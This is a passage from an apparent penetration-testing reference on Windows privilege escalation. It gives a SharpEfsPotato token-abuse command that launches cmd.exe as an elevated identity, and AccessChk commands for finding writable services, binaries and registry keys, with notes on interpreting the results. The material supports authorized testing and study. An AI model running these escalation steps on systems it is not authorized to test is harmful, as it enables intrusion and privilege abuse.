text: id="variant-9-5-2-15-2">9.5.2.15.2 Separate EFS-triggered helper, if its documented prerequisites fit REM Separate EFS-triggered helper, if its documented prerequisites fit SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\identity-check.txt" type C:\Windows\Temp\identity-check.txt Read: verify the exact resulting token/identity and effect. CLSID/RPC/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. Original JuicyPotato is a legacy option and is not a universal modern-Windows escalation. Inspect each helper's local help/version; do not interchange flags across JuicyPotatoNG, GodPotato and SharpEfsPotato. Sources: upstream 1 · upstream 2 . <h2

title: 9.5.2.16 AccessChk — verify the exact service, file or registry permission
text: id="accesschk--verify-the-exact-service-file-or-registry-permission">9.5.2.16 AccessChk — verify the exact service, file or registry permission Use after WinPEAS, PrivescCheck or a manual check identifies a candidate. Query the current identity and the exact object; a writable service binary and service-configuration rights are different paths. whoami accesschk.exe -nobanner -v -c "DOMAIN\USER" SERVICE accesschk.exe -nobanner -v "DOMAIN\USER" "C:\Path\To\PROGRAM.exe" accesschk.exe -nobanner -v -k "DOMAIN\USER" "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE" :: Broader candidate discovery; retain errors rather than suppressing them accesschk.exe -nobanner -w -v -c "DOMAIN\USER" * Read: SERVICE_CHANGE_CONFIG , WRITE_DAC , file modification and registry value modification enable different operations. Next inspect sc.exe qc SERVICE , executable/parent ACLs, service identity and a permitted restart/trigger. A write result alone does not establish SYSTEM execution. Empty write-filtered output is not a complete permission inventory; inspect the exact object without -w and check errors. Use the existing sc.exe sdshow , icacls and PowerShell ACL checks if AccessChk is unavailable. Sources: upstream 1 . <h2
